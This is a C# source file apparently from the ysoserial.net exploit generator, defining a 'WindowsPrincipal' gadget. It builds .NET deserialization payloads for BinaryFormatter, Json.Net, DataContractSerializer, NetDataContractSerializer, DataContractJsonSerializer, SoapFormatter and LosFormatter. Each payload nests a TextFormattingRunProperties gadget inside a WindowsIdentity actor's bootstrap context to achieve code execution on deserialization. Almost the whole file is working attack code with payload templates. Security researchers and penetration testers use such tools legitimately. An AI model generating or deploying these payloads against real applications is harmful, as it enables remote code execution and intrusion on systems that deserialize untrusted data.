using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Claims;
using System.Security.Principal;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    public class WindowsPrincipalGenerator : GenericGenerator
    {
        // A double "Fook Sao" from BinaryFormatter constructor/callback to BinaryFormatter
        // Useful for Json.Net since it invokes ISerializable callbacks during deserialization

        // WindowsIdentity extends ClaimsIdentity and WindowsPrincipal / WindowsClaimsPrincipal uses WindowsIdentity
        // https://referencesource.microsoft.com/#mscorlib/system/security/claims/ClaimsIdentity.cs,60342e51e4acc828,references

        // System.Security.ClaimsIdentity.bootstrapContext is an SerializationInfo key (BootstrapContextKey)
        // added during serialization with binary formatter serialized Claims

        // protected ClaimsIdentity(SerializationInfo info, StreamingContext context)
        // private void Deserialize
        // using (MemoryStream ms = new MemoryStream(Convert.FromBase64String(info.GetString(BootstrapContextKey))))
        //     m_bootstrapContext = bf.Deserialize(ms, null, false);
        //
        // ## Notes: 
        // "actor" contains the serialized base64 WindowsIdentity which inturn contains a ClaimsIdentity pivoting to BinaryFormatter
        // "m_identity" is the WindowsIdentity property on the WindowsPrincipal / WindowsClaimsPrincipal instance :->
        //
        // this uses BinaryFormatter internally - as a result, it is not directly possible to shorten it
        // it is possible to shorten it in multi steps by creating the parts using JSON to BinaryFormatter capability - only useful when we are absolutely desperate!

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "Json.Net", "DataContractSerializer", "DataContractJsonSerializer", "NetDataContractSerializer", "SoapFormatter", "LosFormatter" };
        }

        public override string Name()
        {
            return "WindowsPrincipal";
        }

        public override string Finders()
        {
            return "Steven Seeley of Qihoo 360 Vulcan Team";
        }

        public override string Contributors()
        {
            return "Chris Anastasio";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.BridgeAndDerived };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            WindowsIdentity currentWI = WindowsIdentity.GetCurrent();
            currentWI.Actor = new ClaimsIdentity();
            //id.Actor.BootstrapContext = TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs);
            currentWI.Actor.BootstrapContext = TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs);

            byte[] gadget =  (byte[]) SerializeWithNoTest(currentWI, "binaryformatter", inputArgs);
            string b64encoded = Convert.ToBase64String(gadget);

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
            {
                WindowsPrincipalMarshal obj = new WindowsPrincipalMarshal();
                obj.wi = currentWI;
                return Serialize(obj, formatter, inputArgs);
            }
            else if (formatter.ToLower().Equals("json.net"))
            {
                string payload = @"{
                    '$type': 'System.Security.Principal.WindowsPrincipal, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                    'Identity':{
                        '$type':'System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                        'System.Security.ClaimsIdentity.actor': '" + b64encoded + @"'
                    }
                }";

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = JsonHelper.Minify(payload, new string[] { "mscorlib" }, new string[] { ",mscorlib" });
                    }
                    else
                    {
                        payload = JsonHelper.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractserializer"))
            {
                string payload = $@"<root type=""System.Security.Principal.WindowsPrincipal, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <WindowsPrincipal xmlns=""http://schemas.datacontract.org/2004/07/System.Security.Principal"" xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" >
        <m_identity>
            <System.Security.ClaimsIdentity.actor i:type=""x:string"" xmlns="""" xmlns:x=""http://www.w3.org/2001/XMLSchema"" >
                {b64encoded}
            </System.Security.ClaimsIdentity.actor>
        </m_identity>
    </WindowsPrincipal>
</root>";

                // this will break the payload, because x is used! todo for @irsdl: fix the xslt in XmlMinifier.cs to have the option to include "unused variables"
                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlHelper.Minify(payload, new string[] { "mscorlib" }, new string[] { ",mscorlib" });
                    }
                    else
                    {
                        payload = XmlHelper.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root", "type");

                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("netdatacontractserializer"))
            {

                string payload = $@"<WindowsPrincipal z:Type=""System.Security.Principal.WindowsPrincipal"" z:Assembly=""mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" xmlns=""http://schemas.datacontract.org/2004/07/System.Security.Principal"" xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" >
    <m_identity z:Type=""System.Security.Principal.WindowsIdentity"" z:Assembly=""mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" >
        <System.Security.ClaimsIdentity.actor z:Type=""System.String"" z:Assembly=""0"" xmlns="""">
            {b64encoded}
        </System.Security.ClaimsIdentity.actor>
    </m_identity>
</WindowsPrincipal>";

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlHelper.Minify(payload, new string[] { "mscorlib" }, null);
                    }
                    else
                    {
                        payload = XmlHelper.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.NetDataContractSerializer_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractjsonserializer"))
            {
                string payload = "{\"__type\":\"WindowsPrincipal:#System.Security.Principal\",\"m_identity\":{\"System.Security.ClaimsIdentity.actor\":\"" + b64encoded + "\"}}";

                // this is unsupported for this formatter
                if (inputArgs.Minify || inputArgs.UseSimpleType){}

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.DataContractJsonSerializer_deserialize(payload, typeof(WindowsPrincipal).AssemblyQualifiedName, null);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("soapformatter"))
            {
                string payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC= ""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
    <SOAP-ENV:Body>
        <a1:WindowsPrincipal xmlns:a1=""http://schemas.microsoft.com/clr/ns/System.Security.Principal"">
            <m_identity href = ""#ref-2"" />
            <m_roles xsi:null=""1"" />
            <m_rolesTable xsi:null=""1"" />
            <m_rolesLoaded>false</m_rolesLoaded>
        </a1:WindowsPrincipal>
        <a1:WindowsIdentity id=""ref-2"" xmlns:a1=""http://schemas.microsoft.com/clr/ns/System.Security.Principal"">
            <System.Security.ClaimsIdentity.actor>{b64encoded}</System.Security.ClaimsIdentity.actor>
        </a1:WindowsIdentity>
    </SOAP-ENV:Body>
</SOAP-ENV:Envelope>";

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlHelper.Minify(payload, new string[] { "mscorlib" }, null, FormatterType.SoapFormatter);
                    }
                    else
                    {
                        payload = XmlHelper.Minify(payload, null, null, FormatterType.SoapFormatter);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.SoapFormatter_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }

    }

    [Serializable]
    public class WindowsPrincipalMarshal : ISerializable
    {
        public WindowsPrincipalMarshal() { }
        public WindowsIdentity wi { get; set; }
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(WindowsPrincipal));
            info.AddValue("m_identity", wi);
        }
    }

}
